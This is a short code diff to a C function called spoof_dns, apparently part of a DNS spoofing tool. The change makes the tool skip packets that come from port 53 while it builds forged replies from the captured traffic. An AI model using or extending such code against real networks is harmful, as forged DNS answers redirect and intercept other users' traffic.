@@ -378,6 +378,10 @@ void spoof_dns(int sock) {
     int size;
     int data_len;
     while ((size = read(sock, recv_buffer, 65535)) > 0) {
+        if (ntohs(recv_uh->source) == 53) {
+            //Ignore responding to legit dns repsonses
+            continue;
+        }
         //Destination is received source mac
         memcpy(eh->ether_dhost, recv_eh->ether_shost, ETHER_ADDR_LEN);
 
